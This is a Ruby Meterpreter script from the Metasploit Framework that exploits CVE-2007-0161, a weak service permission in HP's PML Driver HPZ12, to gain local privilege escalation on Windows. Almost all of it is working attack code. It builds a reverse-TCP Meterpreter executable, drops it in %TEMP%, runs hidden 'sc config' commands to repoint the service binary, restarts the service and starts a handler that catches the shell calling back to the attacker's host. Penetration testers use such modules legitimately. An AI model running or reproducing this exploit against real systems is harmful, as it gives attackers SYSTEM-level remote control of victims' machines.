##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# HP Multiple Products PML Driver HPZ12 Local Privilege Escalation.
#
#  This module exploits a privilege escalation vulnerability in
#  Hewlett-Packard's PML Driver HPZ12. Due to an insecure
#  SERVICE_CHANGE_CONFIG DACL permission, a local attacker can
#  gain elevated privileges.
#
#  BID - 21935
#  CVE - 2007-0161
#  mc[@]metasploit.com
##

#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
)

#
# Default parameters
#

rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_status("HP PML Driver HPZ12 SERVICE_CHANGE_CONFIG privilege escalation.")
		print_line(opts.usage)
		raise Rex::Script::Completed
	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i
	end
end
if client.platform =~ /win32|win64/
	client.sys.process.get_processes().each do |m|
		if ( m['name'] =~ /HPZipm12\.exe/ )

			print_status("Found vulnerable process #{m['name']} with pid #{m['pid']}.")

			# Build out the exe payload.
			pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
			pay.datastore['LHOST'] = rhost
			pay.datastore['LPORT'] = rport
			raw  = pay.generate

			exe = Msf::Util::EXE.to_win32pe(client.framework, raw)

			# Place our newly created exe in %TEMP%
			tempdir = client.fs.file.expand_path("%TEMP%")
			tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
			print_status("Sending EXE payload '#{tempexe}'.")
			fd = client.fs.file.new(tempexe, "wb")
			fd.write(exe)
			fd.close

			print_status("Stopping service \"Pml Driver HPZ12\"...")
			client.sys.process.execute("cmd.exe /c sc stop \"Pml Driver HPZ12\" ", nil, {'Hidden' => 'true'})

			print_status("Setting Pml Driver to #{tempexe}...")
			client.sys.process.execute("cmd.exe /c sc config \"Pml Driver HPZ12\" binpath= #{tempexe}", nil, {'Hidden' => 'true'})
			sleep(1)
			print_status("Restarting the \"Pml Driver HPZ12\" service...")
			client.sys.process.execute("cmd.exe /c sc start \"Pml Driver HPZ12\" ", nil, {'Hidden' => 'true'})

			# Our handler to recieve the callback.
			handler = client.framework.exploits.create("multi/handler")
			handler.datastore['WORKSPACE']     = client.workspace
			handler.datastore['PAYLOAD']       = "windows/meterpreter/reverse_tcp"
			handler.datastore['LHOST']         = rhost
			handler.datastore['LPORT']         = rport
			handler.datastore['ExitOnSession'] = false

			handler.exploit_simple(
				'Payload'	=> handler.datastore['PAYLOAD'],
				'RunAsJob'       => true
			)

			client.sys.process.execute("cmd.exe /c sc config \"Pml Driver HPZ12\" binpath= %SystemRoot%\\system32\\HPZipm12.exe", nil, {'Hidden' => 'true'})

		end
	end
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
